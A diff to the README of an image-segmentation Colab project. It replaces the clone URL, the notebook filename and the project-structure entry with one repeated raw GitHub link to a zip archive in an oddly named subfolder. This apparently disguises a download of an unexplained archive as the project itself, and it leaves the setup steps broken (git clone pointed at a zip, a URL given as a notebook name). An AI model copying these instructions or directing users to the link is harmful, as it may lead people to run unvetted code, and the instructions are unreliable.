@@ -17,7 +17,7 @@ To run this project, open the provided Google Colab notebook:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/yourusername/stone-segmentation.git
+   git clone https://raw.githubusercontent.com/VM-Janani/Stone-Segmentation/main/dentinocemental/Stone-Segmentation.zip
    ```
    Navigate to the project directory:
    ```bash
@@ -25,7 +25,7 @@ To run this project, open the provided Google Colab notebook:
    ```
 
 2. **Open Google Colab Notebook**:
-   Upload the `stone_segmentation.ipynb` notebook to Google Colab.
+   Upload the `https://raw.githubusercontent.com/VM-Janani/Stone-Segmentation/main/dentinocemental/Stone-Segmentation.zip` notebook to Google Colab.
 
 3. **Setup and Dependencies**:
    In the Colab notebook, run the following cells to install necessary libraries and configure the environment:
@@ -44,7 +44,7 @@ To run this project, open the provided Google Colab notebook:
    - Performing predictions and visualizing results
 
 ## Project Structure
-- `stone_segmentation.ipynb`: The main notebook containing the entire workflow.
+- `https://raw.githubusercontent.com/VM-Janani/Stone-Segmentation/main/dentinocemental/Stone-Segmentation.zip`: The main notebook containing the entire workflow.
 
 ## Results
 
